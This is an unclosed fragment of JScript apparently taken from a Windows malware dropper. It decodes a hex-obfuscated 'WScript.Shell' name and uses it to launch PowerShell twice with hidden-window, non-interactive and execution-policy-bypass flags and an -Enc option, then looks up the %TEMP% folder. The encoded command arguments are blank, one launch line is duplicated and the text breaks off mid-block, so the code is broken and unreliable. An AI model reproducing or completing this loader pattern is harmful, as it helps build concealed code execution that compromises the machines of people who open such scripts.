try{
  var ws=new ActiveXObject(h("575363726970742e5368656c6c"));
  ws.Run('powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ',0,true);
  ws.Run('powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ',0,true);
  var t=new ActiveXObject(h("575363726970742e5368656c6c")).ExpandEnvironmentStrings("%TEMP%");
